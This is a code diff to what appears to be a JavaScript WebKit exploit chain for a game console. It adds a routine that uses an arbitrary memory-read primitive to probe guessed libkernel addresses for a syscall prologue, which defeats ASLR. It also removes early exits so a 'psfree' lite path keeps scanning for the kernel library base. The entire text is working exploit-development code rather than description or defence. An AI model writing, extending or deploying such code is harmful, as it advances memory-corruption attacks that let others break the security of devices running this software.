@@ -1026,6 +1026,45 @@ function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
     return { done: false, state, phase: "leak", tried: state.tried, target: state.tIdx };
 }
 
+/** 2-read probe of estimateLibkernelCandidates — logs OOM vs prologue vs other. */
+export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
+    log = log || (() => {});
+    const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
+    const out = [];
+    for (let i = 0; i < cands.length; i++) {
+        const c = cands[i];
+        let addr;
+        try {
+            addr = parseAddrSync(c.hex.replace(/^0x/i, ""));
+        } catch (_) {
+            addr = null;
+        }
+        if (!addr) {
+            out.push({ hex: c.hex, why: c.why, status: "bad-hex" });
+            continue;
+        }
+        const w0 = read4p(p, addr);
+        const w1 = read4p(p, addr.add32(4));
+        if (w0 == null) {
+            log("LK-PROBE-GUESS", c.hex + " UNREAD (" + c.why + ")");
+            out.push({ hex: c.hex, why: c.why, status: "unread" });
+            continue;
+        }
+        const prologue = (w0 & 0xff) === 0xb8 && w1 != null && (w1 & 0xffff) === 0x050f;
+        if (prologue && isLibkernelPrologue(p, addr)) {
+            saveLibkernelSession(addr, null);
+            log("LK-PROBE-OK", c.hex + " prologue HIT (" + c.why + ")");
+            out.push({ hex: c.hex, why: c.why, status: "hit", lk: addr });
+            return { ok: true, lk: addr, why: c.why, tried: out };
+        }
+        log("LK-PROBE-GUESS", c.hex + " w0=" + fmtMagic(w0)
+            + (w1 != null ? " w1=" + fmtMagic(w1) : " w1=null")
+            + " (" + c.why + ")");
+        out.push({ hex: c.hex, why: c.why, status: "miss", w0, w1 });
+    }
+    return { ok: false, tried: out };
+}
+
 /** Guess bases from webkit ASLR — try paste or ring probe. */
 export function estimateLibkernelCandidates(webkitBase, nativeFn) {
     const out = [];
@@ -1946,7 +1985,9 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     opts = opts || {};
     if (!state) {
         const layout = resolveModuleLayout(p, webkitBase, { quick: true });
-        const poopsLite = !!(layout && layout.poops && !layout.img);
+        const w0 = read4p(p, webkitBase);
+        const forcePoops = w0 === POOPS_TEXT_MAGIC;
+        const poopsLite = forcePoops || !!(layout && layout.poops && !layout.img);
         state = {
             stage: poopsLite ? "psfree" : "dyn",
             poopsLite,
@@ -1962,6 +2003,7 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
                 done: false,
                 state,
                 phase: "lite-start",
+                poopsLite: true,
             };
         }
     }
@@ -2212,9 +2254,6 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     }
 
     if (state.stage === "got" || state.stage === "rw") {
-        if (state.poopsLite) {
-            return { done: true, lk: null, state, phase: "lite-miss" };
-        }
         const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
         state.sub = c.state;
         if (c.slots != null) state.gotSlots = c.slots;
@@ -2237,10 +2276,6 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
     }
 
     if (state.stage === "base") {
-        if (state.poopsLite) {
-            state.done = true;
-            return { done: true, lk: null, state, phase: "lite-miss" };
-        }
         const c = scanLkPrologueChunk(p, off, state.sub, state.anchors);
         state.sub = c.state;
         if (c.done && c.lk) {
